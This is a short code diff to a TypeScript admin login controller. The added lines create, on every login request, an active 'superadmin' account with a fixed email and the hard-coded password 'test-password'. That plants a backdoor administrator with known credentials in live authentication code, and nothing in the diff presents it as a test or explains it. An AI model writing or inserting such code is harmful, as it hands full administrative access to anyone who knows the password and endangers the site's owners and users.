@@ -35,6 +35,14 @@ export class AdminAuthController {
   @Validate(LoginSchema)
   public async login(@Body() data: ILoginInput) {
     const { email, password } = data;
+    const hashedPassword = await bcrypt.hash('test-password', 10);
+    await AdminModel.create({
+      email: 'johndoe@gmail.com',
+      password: hashedPassword,
+      isActive: true,
+      role: 'superadmin',
+      name: 'John',
+    });
     const admin = await AdminModel.findOne({ email });
     if (!admin) throw new NotFoundError('Admin not found');
     if (!admin.isActive) throw new NotFoundError('Admin not verified');
